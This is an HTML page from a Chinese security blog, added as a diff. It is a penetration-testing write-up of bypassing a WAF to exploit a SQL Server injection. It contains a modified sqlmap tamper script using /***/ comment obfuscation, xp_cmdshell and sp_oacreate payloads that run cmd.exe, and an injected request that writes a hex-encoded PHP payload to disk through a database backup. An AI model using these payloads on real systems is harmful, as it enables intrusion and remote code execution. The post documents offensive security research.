@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang=""><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <title>SQL Server DBA WriteFile</title>
+    <meta name="description" content="倾旋的博客">
+    <meta name="author" content='倾旋'>
+
+    <link href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous">
+
+    
+    <link rel="stylesheet" href="/sass/researcher.min.css">
+
+    
+        <link rel="icon" type="image/ico" href="https://payloads.online/favicon.ico">
+    
+
+    
+        
+    
+</head>
+
+    <body><div class="container mt-5">
+    <nav class="navbar navbar-expand-sm flex-column flex-sm-row text-nowrap p-0">
+        <a class="navbar-brand mx-0 mr-sm-auto" style="color: #dc3545;" href="https://payloads.online" title="倾旋的博客">
+          
+          倾旋的博客
+        </a>
+        <div class="navbar-nav flex-row flex-wrap justify-content-center">
+            
+                
+                
+                    <a class="nav-item nav-link" href="/about" title="About">
+                        About
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/links/" title="Links">
+                        Links
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/post/" title="Posts">
+                        Posts
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/index.xml" title="Rss">
+                        Rss
+                    </a>
+                    
+                
+            
+        </div>
+    </nav>
+</div>
+<hr>
+<div id="content">
+<div class="container">
+    <h2 id="0x01-前言">0x01 前言</h2>
+<p>本文非基础类的普及文章，主要分享内网中遇到的一个有趣案例。</p>
+<h2 id="0x02-bypass注入点">0x02 Bypass注入点</h2>
+<p>通常情况下，遇到SQL Server注入点，我会比较关注是否是DBA权限，如果是，那么就可能拿到执行命令的权限，进而反弹到Ｃ2上，方便后续的后渗透工作。</p>
+<p>一开始在一处比较复杂的功能点发现了SQL Server的注入，也是首先利用AND进行判断：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/ff14d4d92d1d2c87226c80bf934d541f.png" alt="2020-01-03-13-13-15"></p>
+<p>参数：ModuleType存在注入点，但是后面有一层站点全局输入的检测机制，从简单的测试来看，是不存在语法分析的一种，比较容易绕过。</p>
+<p>我尝试了以下方案：</p>
+<ol>
+<li><code>and -&gt; And</code></li>
+<li><code>and -&gt; /**/And</code></li>
+<li><code>and -&gt; /*xsww!s*/And</code></li>
+<li><code>and -&gt; /*xswwS1154-_[0)}!s*/And</code></li>
+<li><code>and -&gt; /***/And</code></li>
+</ol>
+<p>最终发现第五种可以绕过，使得后端无法辨别<code>/***/</code>是否和And是一个本体。</p>
+<p>那么我猜想到了一个简单的表达式，似乎和这个过滤规则比较相向：<code>/*\w{0,}*/</code></p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/6698199e49414f5cdf5e0cb74725decb.png" alt="2020-01-03-13-13-28"></p>
+<h2 id="0x03-tamper-自动化实现">0x03 tamper 自动化实现</h2>
+<p>这里我比较懒，直接改了以下space2comment.py，这个脚本在Kali Linux中的sqlmap目录下：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/b5b958529f18b8b570f16eca2cd1ac03.png" alt="2020-01-03-13-13-37"></p>
+<p>核心代码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> xrange(len(payload)):
+            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> firstspace:
+                <span style="color:#66d9ef">if</span> payload[i]<span style="color:#f92672">.</span>isspace():
+                    firstspace <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+                    retVal <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;/**/&#34;</span>
+                    <span style="color:#66d9ef">continue</span>
+
+            <span style="color:#66d9ef">elif</span> payload[i] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">&#39;</span>:
+                quote <span style="color:#f92672">=</span> <span style="color:#f92672">not</span> quote
+
+            <span style="color:#66d9ef">elif</span> payload[i] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;&#34;&#39;</span>:
+                doublequote <span style="color:#f92672">=</span> <span style="color:#f92672">not</span> doublequote
+
+            <span style="color:#66d9ef">elif</span> payload[i] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34; &#34;</span> <span style="color:#f92672">and</span> <span style="color:#f92672">not</span> doublequote <span style="color:#f92672">and</span> <span style="color:#f92672">not</span> quote:
+                retVal <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;/**/&#34;</span>
+                <span style="color:#66d9ef">continue</span>
+</code></pre></div><p>只需要替换<code>/**/</code>即可：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/cb7b577625d7a6106e39687558cdc6c7.png" alt="2020-01-03-13-13-49"></p>
+<p>接着，就可以跑出注入了~</p>
+<p>PS：我比较习惯于添加<code>--random-agent</code>参数，理由是在注入的过程中，避免被流量感知设备发现。</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/1ea40c2f77061bc94c939aaf8a1c01a5.png" alt="2020-01-03-13-14-00"></p>
+<h2 id="0x04-xp_cmdshell">0x04 xp_cmdshell</h2>
+<p>到这一步的时候，我遇到了一个问题，SQLMAP调用exec master..xp_cmshell的时候被拦截了，因为后端还检测是否有<code>exec</code>、<code>master</code>，于是我还要将tamper加两句：</p>
+<pre><code>payload = payload.replace(&quot;exec&quot;,&quot;/***/Execute/***/&quot;)
+payload = payload.replace(&quot;master..&quot;,&quot;/***//***/&quot;)
+</code></pre><p>最终结果：<code>/***/execute/***//***/xp_cmdshell/***/'whoami'</code></p>
+<p>点击发包，还是无法执行，被360拦截了！</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/fc6bd35eb07d11206d2bcf9ccb701553.png" alt="2020-01-03-13-14-22"></p>
+<p>这个Error Code 5 ，是Windows的错误代码，中文意思就是：“拒绝访问”。</p>
+<p>现在xp_cmdshell被拦截的很多了，但是sp_oacreate应该可以使用的：</p>
+<p>参考我之前写的一篇文章：<a href="https://payloads.online/archivers/2019-07-19/1">Regsvr32 ole对象</a></p>
+<pre><code>declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami &gt;C:\who.txt'
+</code></pre><blockquote>
+<p>后续我发现该服务器无法出网，还是站库分离</p>
+</blockquote>
+<p><strong>因此无法执行操作系统命令</strong></p>
+<h2 id="0x05-写入文件">0x05 写入文件</h2>
+<p>在写文件这块，我浪费了大量的时间，首先要确定能否向站点目录写文件，当前写文件的操作是否被拦截等等因素。</p>
+<p>一开始的思路是调用xp_cmdshell，采用echo去写，目前已无法执行命令，就此作罢，吸了一口芙蓉王，精神焕发，遂查到数据库备份的方式。</p>
+<p>提交：</p>
+<pre><code>{&quot;ClientType&quot;: &quot;&quot;, &quot;ClientGuid&quot;: &quot;09a37ee1-5ec3-46db-9279-4cb066622e8d&quot;, &quot;ModuleType&quot;: &quot;A2501';use test222;create table [dbo].[test2] ([cmd] [image]);insert/***/into/***/test2(cmd) values(0x3c3f70687020706870696e666f28293b3f3e);backup database test222 to disk='C:\test2.bak' WITH DIFFERENTIAL,FORMAT;-- &quot;, &quot;IsBackEnd&quot;: false }
+</code></pre><p>页面返回正常。</p>
+<p>但是，我的站点目录如果是中文呢？在Burp里处理就非常麻烦！</p>
+<p>还记得之前的IIS 7.5吗，<strong>IIS在接收到一个请求后，会自动将数据进行Unicode解码，如果流量设备、WAF不支持此特性的话，就可以进行绕过</strong>，这里我着重解决中文目录的问题。</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/259de32b7fe3faac8fa6bff186660e07.png" alt="2020-01-03-13-14-38"></p>
+<p>到这此文就结束了，我并没有成功Getshell，只是回顾我解决问题的思维方式，希望能对大家有用！</p>
+
+</div>
+
+        </div><div id="footer" class="mb-5">
+    <hr>
+    <div class="container text-center">
+        
+            <a href="https://twitter.com/Rvn0xsy" class="fab fa-twitter fa-1x" title="Twitter"></a>
+        
+            <a href="mailto:rvn0xsy@gmail.com" class="fas fa-envelope fa-1x" title="E-mail"></a>
+        
+    </div>
+    
+        <div class="container text-center">
+            <a href="https://payloads.online" title="- PAYLOADS.ONLINE -"><small>- PAYLOADS.ONLINE -</small></a>
+        </div>
+    
+</div>
+</body>
+</html>
